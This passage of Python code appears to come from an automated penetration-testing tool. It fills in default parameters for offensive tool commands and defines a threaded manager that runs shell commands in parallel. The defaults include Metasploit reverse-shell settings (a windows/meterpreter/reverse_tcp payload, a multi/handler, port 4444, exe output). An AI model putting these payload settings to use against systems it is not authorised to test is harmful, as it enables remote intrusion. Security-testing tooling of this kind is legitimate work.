                elif missing_key == "bucket":
                    format_kwargs["bucket"] = "test-bucket"
                elif missing_key == "container":
                    format_kwargs["container"] = "test-container"
                elif missing_key == "account":
                    format_kwargs["account"] = "test-account"
                elif missing_key == "checks":
                    format_kwargs["checks"] = "all"
                elif missing_key == "port":
                    format_kwargs["port"] = "80"
                elif missing_key == "bssid":
                    format_kwargs["bssid"] = "00:11:22:33:44:55"
                elif missing_key == "duration":
                    format_kwargs["duration"] = "10"
                elif missing_key == "template_dir":
                    format_kwargs["template_dir"] = f"{CONFIG.TMP_DIR}/templates"
                elif missing_key == "binary_file":
                    format_kwargs["binary_file"] = f"{CONFIG.TMP_DIR}/test.bin"
                elif missing_key == "target_dir":
                    format_kwargs["target_dir"] = CONFIG.TMP_DIR
                elif missing_key == "profile":
                    format_kwargs["profile"] = "LinuxSurajx64"
                elif missing_key == "exploit":
                    format_kwargs["exploit"] = "exploit/multi/handler"
                elif missing_key == "payload":
                    format_kwargs["payload"] = "windows/meterpreter/reverse_tcp"
                elif missing_key == "lhost":
                    format_kwargs["lhost"] = "127.0.0.1"
                elif missing_key == "lport":
                    format_kwargs["lport"] = "4444"
                elif missing_key == "format":
                    format_kwargs["format"] = "exe"
                elif missing_key == "collaborator_burp":
                    format_kwargs["collaborator_burp"] = "127.0.0.1"
                elif missing_key == "collaborator_port":
                    format_kwargs["collaborator_port"] = "8080"
                elif missing_key in sensitive:
                    raise ValueError(f"Tool '{tool_name}' requires an explicit '{missing_key}' — refusing to inject a default target/host.")
                else:
                    log(f"[resolve_tool] no value for '{missing_key}' in '{tool_name}', leaving empty")
                    format_kwargs[missing_key] = ""
                # Continue loop to try formatting again

        return cmd, desc, timeout


# ===================== PARALLEL TASK MANAGER =====================

@dataclass
class TaskResult:
    id: int
    cmd: str
    category: str
    stdout: str
    stderr: str
    exit_code: int
    duration: float
    error: Optional[str] = None


class TaskManager:
    """Launches multiple commands in parallel threads and collects results."""

    def __init__(self, executor: ToolExecutor, max_workers: int = 5):
        self.executor = executor
        self.max_workers = max_workers
        self._tasks: Dict[int, dict] = {}
        self._counter = 0
        self._lock = threading.Lock()
        self._completed: List[TaskResult] = []

    def submit(self, cmd: str, category: str = "recon", timeout: int = 300) -> int:
        """Submit a command for parallel execution. Returns task_id."""
        with self._lock:
            self._counter += 1
            task_id = self._counter
            self._tasks[task_id] = {
                "cmd": cmd,
                "category": category,
                "timeout": timeout,
                "status": "pending",
                "start": None,
                "thread": None,
            }
        thread = threading.Thread(target=self._run, args=(task_id,), daemon=True)
        with self._lock:
            self._tasks[task_id]["thread"] = thread
            self._tasks[task_id]["status"] = "running"
            self._tasks[task_id]["start"] = time.time()
        thread.start()
        return task_id

    def _run(self, task_id: int):
        """Internal: execute command in thread and store result."""
        tinfo = self._tasks.get(task_id, {})
        try:
            full_cmd = tinfo.get("cmd", "")
            timeout = tinfo.get("timeout", 300)
            log(f"[TaskManager] [{task_id}] starting: {full_cmd[:120]}")
            out = self.executor.run(full_cmd, timeout=timeout)
            elapsed = time.time() - (tinfo.get("start") or time.time())
            result = TaskResult(
                id=task_id,
                cmd=full_cmd,
                category=tinfo.get("category", "recon"),
                stdout=out.stdout or "",
                stderr=out.stderr or "",
                exit_code=out.returncode,
                duration=elapsed,
            )
            with self._lock:
                self._completed.append(result)
                self._tasks[task_id]["status"] = "done"
            log(f"[TaskManager] [{task_id}] completed in {elapsed:.1f}s (exit={out.returncode})")
        except Exception as e:
            elapsed = time.time() - (tinfo.get("start") or time.time())
            result = TaskResult(
                id=task_id,
                cmd=tinfo.get("cmd", ""),
                category=tinfo.get("category", "recon"),
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration=elapsed,
                error=str(e),
            )
            with self._lock:
                self._completed.append(result)
                self._tasks[task_id]["status"] = "failed"

    def poll(self) -> List[TaskResult]:
        """Return and clear all completed task results since last poll."""
        with self._lock:
            results = list(self._completed)
            self._completed.clear()
        return results

    def running(self) -> int:
        """Number of tasks still executing."""
        with self._lock:
            return sum(1 for t in self._tasks.values() if t.get("status") in ("running", "pending"))

    def wait(self, timeout: float = 300) -> List[TaskResult]:
        """Block until all tasks complete or timeout."""
        deadline = time.time() + timeout
        while self.running() > 0 and time.time() < deadline:
            time.sleep(0.5)
        return self.poll()

    def cancel_all(self):
        """Cancel pending tasks (running threads can't be forcibly killed)."""
        with self._lock:
            for tid, tinfo in self._tasks.items():
                if tinfo.get("status") == "pending":
                    tinfo["status"] = "cancelled"

    def summary(self) -> str:
        """Human-readable summary of task pool."""
        with self._lock:
            total = len(self._tasks)
            done = sum(1 for t in self._tasks.values() if t["status"] == "done")
            failed = sum(1 for t in self._tasks.values() if t["status"] == "failed")
            running = sum(1 for t in self._tasks.values() if t["status"] == "running")
        lines = [f"Tasks: {total} total, {done} done, {running} running, {failed} failed"]
        return "\n".join(lines)
